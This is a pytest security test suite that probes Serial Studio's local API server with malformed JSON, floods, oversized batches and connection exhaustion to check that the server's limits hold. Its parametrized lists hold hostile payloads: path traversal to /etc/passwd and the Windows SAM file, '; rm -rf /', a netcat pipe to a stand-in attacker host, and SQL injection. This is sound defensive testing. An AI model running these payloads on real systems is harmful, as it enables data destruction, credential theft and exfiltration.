"""
API Security Tests - Pytest Compatible

Comprehensive API security testing including injection attacks,
buffer exploitation, and parameter validation bypass.

Run with:
    pytest tests/security/test_api_security.py -v
    pytest tests/security/test_api_security.py -v -m "not destructive"

Copyright (C) 2020-2025 Alex Spataru
SPDX-License-Identifier: GPL-3.0-only OR LicenseRef-SerialStudio-Commercial
"""

import json
import socket
import time
import uuid
import base64

import pytest


@pytest.mark.security
@pytest.mark.critical
@pytest.mark.destructive
class TestJSONExploits:
    """JSON parsing and structure exploitation tests"""

    def test_deeply_nested_json(self, security_client, check_server_alive):
        """
        Test defense against deeply nested JSON (stack overflow attempt).

        Expected: Server should reject JSON deeper than 64 levels.
        Server may close connection or return error - both are acceptable.
        """
        depth = 10000
        nested = "{" * depth + "}" * depth
        got_error_response = False
        connection_closed = False

        # Try to send deeply nested JSON
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 7777))
            sock.sendall(nested.encode() + b"\n")
            sock.settimeout(3.0)
            response = sock.recv(65536)

            if response:
                # Server sent error response - GOOD!
                if b"error" in response.lower() or b"depth" in response.lower():
                    got_error_response = True
                else:
                    # Server accepted it - BAD!
                    pytest.fail(f"Server accepted {depth} level nesting without error: {response[:200]}")

            sock.close()

        except (socket.timeout, ConnectionError, ConnectionResetError, BrokenPipeError):
            # Connection closed is acceptable (server defending itself)
            connection_closed = True

        # Either error response OR connection closure is acceptable
        # We only care if the server CRASHED (process died)
        assert check_server_alive(wait_time=2.0), "Server crashed on deeply nested JSON (process died)!"

        # Optionally verify defensive behavior worked
        if not (got_error_response or connection_closed):
            pytest.fail(f"Server neither rejected nor closed connection for {depth}-level nesting")

    def test_oversized_json_payload(self, security_client, vuln_tracker):
        """
        Test defense against extremely large JSON objects.

        Expected: Server should reject messages larger than 1MB.
        """
        large_obj = {
            "type": "command",
            "id": str(uuid.uuid4()),
            "command": "api.getCommands",
            "params": {"x" * 1000: "y" * 1000000},  # >1MB parameter
        }

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 7777))
            payload = json.dumps(large_obj).encode() + b"\n"
            payload_size_mb = len(payload) / (1024 * 1024)

            sock.sendall(payload)
            sock.settimeout(2.0)
            response = sock.recv(65536)
            sock.close()

            # Should be rejected
            if b"error" not in response.lower():
                vuln_tracker.log_vulnerability(
                    "HIGH",
                    "Message Size",
                    f"Server accepted {payload_size_mb:.2f}MB payload",
                    payload_size_mb,
                )
                pytest.fail(
                    f"Server accepted {payload_size_mb:.2f}MB payload without limit"
                )

        except (socket.timeout, ConnectionError, MemoryError):
            # Expected - server rejected or connection closed
            pass

    def test_json_with_control_characters(self, security_client, vuln_tracker):
        """Test handling of JSON with embedded control characters"""
        malformed_payloads = [
            b'{"type":"command\x00\x01\x02","command":"test"}',  # NULL bytes
            b'{"type":"command\r\n","id":"test"}',  # CRLF injection
            b'{"type":"command","id":"\x1b[31mRED\x1b[0m"}',  # ANSI escape
        ]

        for i, payload in enumerate(malformed_payloads):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(("127.0.0.1", 7777))
                sock.sendall(payload + b"\n")
                sock.settimeout(1.0)
                response = sock.recv(4096)
                sock.close()

                # Should be rejected or sanitized
                if response and b"error" not in response.lower():
                    vuln_tracker.log_vulnerability(
                        "MEDIUM",
                        "Input Validation",
                        f"Server processed JSON with control chars (payload {i})",
                        payload,
                    )

            except (socket.timeout, ConnectionError):
                pass


@pytest.mark.security
@pytest.mark.critical
class TestInjectionAttacks:
    """Command injection and path traversal tests"""

    @pytest.mark.parametrize(
        "payload",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ],
        ids=["unix_traversal", "windows_traversal", "absolute_unix", "absolute_windows"],
    )
    def test_path_traversal(self, security_client, payload, vuln_tracker):
        """
        Test defense against path traversal in file operations.

        Expected: Server should reject paths outside allowed directories.
        """
        try:
            result = security_client.command("project.file.open", {"filePath": payload})

            # Should NOT succeed
            vuln_tracker.log_vulnerability(
                "CRITICAL",
                "Path Traversal",
                f"Server opened file outside project dir: {payload}",
                payload,
            )
            pytest.fail(f"Path traversal succeeded: {payload} - got result: {result}")

        except Exception as e:
            # Expected - should fail with permission/validation error or connection closure
            error_msg = str(e).lower()
            error_type = type(e).__name__

            # Valid rejection patterns:
            # - APIError with "not allowed", "invalid", "error"
            # - ConnectionError (server closed connection defensively)
            # - Any error containing validation keywords
            valid_rejection = any(
                keyword in error_msg
                for keyword in ["error", "invalid", "closed", "not allowed", "permission", "denied"]
            )

            if not valid_rejection:
                pytest.fail(
                    f"Path traversal for {payload} raised unexpected error:\n"
                    f"  Type: {error_type}\n"
                    f"  Message: {e}\n"
                    f"  Expected keywords: error, invalid, closed, not allowed, permission, denied"
                )
            # else: Test passed - path was rejected with appropriate error

    @pytest.mark.parametrize(
        "injection",
        [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "${USER}",
            "'; DROP TABLE datasets; --",
        ],
        ids=["shell_rm", "shell_pipe", "command_subst", "backtick", "var_expansion", "sql_injection"],
    )
    def test_command_injection(self, security_client, injection, vuln_tracker):
        """Test defense against command injection in parameters"""
        try:
            # Try injecting into various string parameters
            security_client.command("project.setTitle", {"title": injection})

            # Verify the value was escaped/sanitized, not executed
            result = security_client.command("project.getTitle")
            if "uid=" in str(result) or "root" in str(result):
                vuln_tracker.log_vulnerability(
                    "CRITICAL",
                    "Command Injection",
                    f"Code execution via injection: {injection}",
                    injection,
                )
                pytest.fail(f"Command injection executed: {injection}")

        except Exception:
            # Expected - validation should reject
            pass


@pytest.mark.security
@pytest.mark.destructive
class TestBufferExploits:
    """Buffer overflow and exhaustion attacks"""

    def test_buffer_without_newline(self, check_server_alive, vuln_tracker):
        """
        Test line buffer exhaustion by sending data without newlines.

        Expected: Server should close connection when buffer limit (4MB) exceeded.
        This is CORRECT defensive behavior, not a crash!
        """
        connection_closed = False

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 7777))

            # Send chunks without newline
            chunk = b"A" * (1024 * 1024)  # 1MB chunks
            for i in range(10):  # Try to send 10MB total
                try:
                    sock.sendall(chunk)
                except (BrokenPipeError, ConnectionError):
                    connection_closed = True
                    break  # Connection closed - GOOD!

            # If still connected, try to send valid command
            if not connection_closed:
                try:
                    sock.sendall(
                        b'{"type":"command","id":"test","command":"api.getCommands"}\n'
                    )
                    sock.settimeout(2.0)
                    response = sock.recv(4096)
                    sock.close()

                    # Should have been disconnected - if we get valid response, that's bad
                    if response and b"success" in response:
                        vuln_tracker.log_vulnerability(
                            "HIGH",
                            "Buffer Exhaustion",
                            "Server buffered 10MB without newline without disconnecting",
                            "10MB data",
                        )
                        pytest.fail("Server accepted 10MB without newline - buffer limit not enforced!")
                except (socket.timeout, ConnectionError, BrokenPipeError):
                    # Connection closed during command - acceptable
                    connection_closed = True

        except (socket.timeout, ConnectionError, BrokenPipeError):
            # Connection closed early - this is GOOD defensive behavior
            connection_closed = True

        # Defensive connection closure is SUCCESS, not failure!
        # We only care if server CRASHED, not if it defended itself
        assert check_server_alive(), "Server crashed on buffer exhaustion (process died)!"

        # Optionally verify connection WAS closed (defensive behavior working)
        if not connection_closed:
            vuln_tracker.log_vulnerability(
                "MEDIUM",
                "Buffer Management",
                "Server may not enforce buffer limits aggressively",
                "10MB without newline",
            )

    def test_rapid_message_flood(self, security_client, check_server_alive, vuln_tracker):
        """
        Test rate limiting with rapid message flood.

        Expected: Server enforces rate limit (200 msg/sec) and closes connection.
        This is CORRECT defensive behavior!
        """
        connection_closed = False

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 7777))
            sock.settimeout(5.0)

            start = time.time()
            messages_sent = 0

            # Try to send 1000 messages as fast as possible
            for i in range(1000):
                msg = {
                    "type": "command",
                    "id": f"flood-{i}",
                    "command": "api.getCommands",
                }
                try:
                    sock.sendall(json.dumps(msg).encode() + b"\n")
                    messages_sent += 1
                except (ConnectionError, BrokenPipeError):
                    # Server closed connection due to rate limit - GOOD!
                    connection_closed = True
                    break

            elapsed = time.time() - start
            rate = messages_sent / elapsed if elapsed > 0 else 0

            sock.close()

            # Check if rate limiting is working
            # Server limit is 200 msg/sec, so sustained rate > 300 msg/sec suggests no limiting
            if rate > 300 and not connection_closed:
                vuln_tracker.log_vulnerability(
                    "MEDIUM",
                    "Rate Limiting",
                    f"Weak or no rate limiting detected: {rate:.0f} msg/s sustained without disconnect",
                    f"{rate:.0f} msg/s",
                )

        except (socket.timeout, ConnectionError, BrokenPipeError):
            # Connection terminated by server - this is GOOD defensive behavior!
            connection_closed = True

        # Verify server is still alive (didn't crash, just closed connection)
        assert check_server_alive(), "Server crashed on message flood (process died)!"

        # Connection closure on flood is acceptable (defensive behavior)
        # We're only checking that server didn't crash


@pytest.mark.security
@pytest.mark.high
@pytest.mark.destructive
class TestBatchExploits:
    """Batch command abuse and limit bypass"""

    def test_oversized_batch(self, security_client, vuln_tracker):
        """
        Test batch size limit enforcement.

        Expected: Server should reject batches larger than 256 commands.
        """
        huge_batch = [{"command": "api.getCommands"} for _ in range(10000)]

        try:
            results = security_client.batch(huge_batch, timeout=30.0)

            # Should have been rejected
            vuln_tracker.log_vulnerability(
                "MEDIUM",
                "Batch Processing",
                f"Server processed {len(results)} commands without limit",
                f"{len(huge_batch)} commands",
            )
            pytest.fail(f"Server accepted batch of {len(huge_batch)} commands")

        except Exception as e:
            # Expected - should reject with size limit error (may close connection)
            error_msg = str(e).lower()
            assert any(keyword in error_msg for keyword in ["limit", "error", "broken pipe", "closed"])

    def test_batch_at_limit(self, security_client):
        """
        Test batch exactly at the limit (256 commands).

        Note: Server limit is 256 commands per batch (check uses >).
        However, server also has rate limit of 200 messages/second.
        A batch is ONE message, so this should succeed.
        """
        batch = [{"command": "api.getCommands"} for _ in range(256)]

        try:
            # This should succeed (at limit, not over)
            # Increased timeout because processing 256 commands takes time
            results = security_client.batch(batch, timeout=60.0)
            assert len(results) == 256, f"Expected 256 results, got {len(results)}"

        except ConnectionError as e:
            # Connection closed - check if it's due to response size or other issue
            if "closed by server" in str(e).lower():
                pytest.fail(
                    f"Server closed connection during batch at limit (256). "
                    f"This might be due to: (1) response size exceeding buffer limit, "
                    f"(2) timeout waiting for client to read response, or "
                    f"(3) incorrect batch size validation. Error: {e}"
                )
            else:
                pytest.fail(f"Connection error during batch at limit (256): {e}")

        except TimeoutError as e:
            pytest.fail(
                f"Timeout waiting for batch response (256 commands). "
                f"Server might be too slow or deadlocked. Error: {e}"
            )

        except Exception as e:
            pytest.fail(
                f"Unexpected error with batch at limit (256): {type(e).__name__}: {e}"
            )

    def test_batch_over_limit(self, security_client):
        """Test batch over the limit (257 commands)"""
        batch = [{"command": "api.getCommands"} for _ in range(257)]

        # This should fail
        with pytest.raises(Exception) as exc_info:
            security_client.batch(batch, timeout=30.0)

        # Verify it failed due to size limit (may close connection)
        error_msg = str(exc_info.value).lower()
        assert any(keyword in error_msg for keyword in ["limit", "error", "closed"])


@pytest.mark.security
@pytest.mark.destructive
class TestConnectionExhaustion:
    """Connection limit and resource exhaustion"""

    def test_connection_limit(self, check_server_alive, vuln_tracker):
        """
        Test connection limit enforcement.

        Expected: Server should limit simultaneous connections to 8.
        Rejecting connections beyond limit is CORRECT defensive behavior!
        """
        active_sockets = []
        rejected_count = 0

        try:
            for i in range(50):  # Try to open 50 connections
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                try:
                    sock.connect(("127.0.0.1", 7777))

                    # Verify connection is actually active by sending a small message
                    test_msg = {"type": "command", "id": f"test-{i}", "command": "api.getCommands"}
                    sock.sendall(json.dumps(test_msg).encode() + b"\n")

                    # Try to receive response to confirm connection is active
                    try:
                        sock.recv(1024)
                        active_sockets.append(sock)
                    except socket.timeout:
                        # No response but connection accepted
                        active_sockets.append(sock)

                except (ConnectionRefusedError, ConnectionError, OSError, BrokenPipeError):
                    # Connection was rejected or closed - GOOD! Limit is working
                    rejected_count += 1
                    try:
                        sock.close()
                    except:
                        pass
                    continue

            # Verify connection limit is being enforced
            # Server limit is 8, we allow some margin for timing (up to 12)
            if len(active_sockets) > 12:
                vuln_tracker.log_vulnerability(
                    "HIGH",
                    "Connection Limit",
                    f"Weak or no connection limit: {len(active_sockets)} active connections (limit should be 8)",
                    f"{len(active_sockets)} connections",
                )
                pytest.fail(f"Server accepted {len(active_sockets)} connections (limit should be ~8)")

            # We should have SOME rejections if we tried to open 50 connections
            if rejected_count == 0:
                vuln_tracker.log_vulnerability(
                    "MEDIUM",
                    "Connection Limit",
                    f"No connections rejected (opened {len(active_sockets)} out of 50 attempts)",
                    f"{len(active_sockets)} connections",
                )

        finally:
            # Clean up all sockets
            for sock in active_sockets:
                try:
                    sock.close()
                except:
                    pass

            # Give server time to clean up
            time.sleep(0.5)

        # Verify server didn't crash (rejecting connections is OK!)
        assert check_server_alive(), "Server crashed on connection exhaustion (process died)!"


@pytest.mark.security
class TestParameterValidation:
    """Parameter validation and type confusion"""

    @pytest.mark.parametrize(
        "fps_value",
        ["not_a_number", -1, 0, 999999, None, [], {}],
        ids=["string", "negative", "zero", "huge", "null", "array", "object"],
    )
    def test_fps_type_validation(self, security_client, fps_value):
        """Test FPS parameter type validation"""
        try:
            security_client.command("dashboard.setFPS", {"fps": fps_value})

            # Should have rejected invalid type/value
            if isinstance(fps_value, (list, dict, type(None))) or not isinstance(fps_value, (int, float)):
                pytest.fail(f"Server accepted invalid FPS type: {type(fps_value)}")

        except Exception:
            # Expected - validation should reject
            pass


@pytest.mark.security
@pytest.mark.slow
class TestRawDataInjection:
    """Raw data injection without authentication"""

    def test_raw_data_injection(self, vuln_tracker):
        """Test if raw data can be injected without device connection"""
        malicious_data = b"INJECTED_PAYLOAD\r\n"
        encoded = base64.b64encode(malicious_data).decode()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", 7777))

            msg = {"type": "raw", "id": str(uuid.uuid4()), "data": encoded}

            sock.sendall(json.dumps(msg).encode() + b"\n")
            sock.settimeout(2.0)
            response = sock.recv(4096)
            sock.close()

            # Should fail if not connected to device
            if b"success" in response or b"bytesWritten" in response:
                vuln_tracker.log_vulnerability(
                    "HIGH",
                    "Data Injection",
                    "Raw data injection without device connection",
                    malicious_data,
                )
                pytest.fail("Server allowed raw data injection without device")

        except Exception:
            # Expected - should require device connection
            pass
